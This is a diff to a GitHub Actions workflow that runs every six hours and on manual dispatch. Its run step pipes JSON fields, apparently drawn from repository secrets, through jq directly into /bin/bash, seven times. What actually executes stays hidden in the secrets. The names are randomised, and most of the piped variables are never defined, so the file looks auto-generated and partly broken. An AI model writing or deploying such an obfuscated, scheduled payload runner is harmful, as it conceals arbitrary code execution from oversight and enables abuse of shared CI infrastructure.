@@ -1,21 +1,24 @@
 name: moguangmin1989
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '56 4/6 * * *'
+    - cron: '13 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: moguangmin1989
         env:
-          ceqw0778: ${{ secrets.ceqw0778 }}
+          g6: ${{ secrets.g6 }}
         run: |
-          echo $ceqw0778 | jq -r .uprl797 | /bin/bash
-          echo $vefas432 | jq -r .kbdu0 | /bin/bash
-          echo $vqu0 | jq -r .pgr955 | /bin/bash
-          echo $bfxi0818 | jq -r .gwfvf49419 | /bin/bash
-          echo $ukyi7 | jq -r .njtt0553 | /bin/bash
+          echo $g6 | jq -r .cfm239 | /bin/bash
+          echo $vf2202 | jq -r .nr0499 | /bin/bash
+          echo $fwd18870 | jq -r .ske9 | /bin/bash
+          echo $uyef88 | jq -r .bxan82 | /bin/bash
+          echo $tetb05123 | jq -r .v6275 | /bin/bash
+          echo $dvjs90239 | jq -r .jb27 | /bin/bash
+          echo $tp62 | jq -r .ptst2 | /bin/bash
 
